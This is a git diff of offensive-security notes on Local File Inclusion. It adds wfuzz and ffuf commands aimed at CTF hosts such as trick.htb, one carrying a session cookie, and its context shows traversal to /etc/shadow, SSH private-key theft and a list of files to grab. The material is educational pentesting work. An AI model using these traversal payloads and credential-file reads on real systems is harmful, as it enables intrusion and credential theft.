@@ -2,28 +2,6 @@
 
 ### LFI Local File Inclusion
 
-#### Table of Contents
-
-* [LFI Local File Inclusion](LFI.md#lfi-local-file-inclusion)
-  * [Table of Contents](LFI.md#table-of-contents)
-  * [Introduction](LFI.md#introduction)
-    * [Example:](LFI.md#example-)
-  * [Directory Traversal](LFI.md#directory-traversal)
-    * [Basic Linux Test](LFI.md#basic-linux-test)
-  * [PHP Wrappers](LFI.md#php-wrappers)
-    * [PHP Expect Wrapper](LFI.md#php-expect-wrapper)
-    * [PHP Filter Wrapper](LFI.md#php-filter-wrapper)
-  * [RCE via SSH](LFI.md#rce-via-ssh)
-  * [RCE via Apache logs](LFI.md#rce-via-apache-logs)
-  * [LFI to RCE via credentials files](LFI.md#lfi-to-rce-via-credentials-files)
-    * [Windows version](LFI.md#windows-version)
-    * [Linux version](LFI.md#linux-version)
-  * [Automated LFI with Wfuzz](LFI.md#automated-lfi-with-wfuzz)
-  * [Resources](LFI.md#resources)
-* [Requests to look out for](LFI.md#requests-to-look-out-for)
-  * [Fuzzing for subdomains](LFI.md#fuzzing-for-subdomains)
-  * [Files to grab if you get LFI](LFI.md#files-to-grab-if-you-get-lfi)
-
 #### Introduction
 
 * An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server.
@@ -203,7 +181,7 @@ http://example.com/index.php?page=../../../../../../etc/shadow
 * Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id\_rsa.
 * If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
 
-#### Automated LFI with Wfuzz
+### Automated LFI with Wfuzz
 
 * Automate LFI Tests
 * Download the `traversal.txt` file in this folder (from PayloadAllTheThings)
@@ -221,6 +199,12 @@ wfuzz -u "http://10.10.218.222/article?name=FUZZ" -w traversal.txt | grep 200
 * https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
 * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-phpinfo
 
+#### Wfuzz for LFI with a Cookie
+
+```
+wfuzz -u http://preprod-payroll.trick.htb/index.php?page=FUZZ -b PHPSESSID=lh8uclpbf9guo8ih3f6h58b2bn -w /opt/traversal.txt
+```
+
 ### Requests to look out for
 
 * ![alt text](https://miro.medium.com/max/2400/1\*uMZmYUNcqjh4Rht11nGQDw.png)
@@ -228,20 +212,27 @@ wfuzz -u "http://10.10.218.222/article?name=FUZZ" -w traversal.txt | grep 200
 * Attempt to fuzz the parameter for command injection and file inclusion
 * Wordlist to use:
 
+{% file src="../.gitbook/assets/traversal.txt" %}
+
 ```
-traversal.txt
 /usr/share/Seclists/Discovery/Web-Content/burp-parameter-names.txt
 ```
 
 * Use FFuF, or wfuzz
 
-#### Fuzzing for subdomains
+### FFuf Fuzzing for subdomains
 
 ```
 ffuf -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 5829
 ```
 
-* #### Files to grab if you get LFI
+* Notice that you will get back responses with a similar character count, these are often the ones that will fail, to make the output more readable, filter on the bad character count and look for one with a unique character count.
+
+```
+ffuf -w /mnt/home/dasor/wordlist/directory-list-2.3-big.txt:FUZZ -u http://trick.htb/ -H 'Host: preprod-FUZZ.trick.htb' -v -fs 5480
+```
+
+### Files to grab if you get LFI
 
 ```
 /etc/passwd
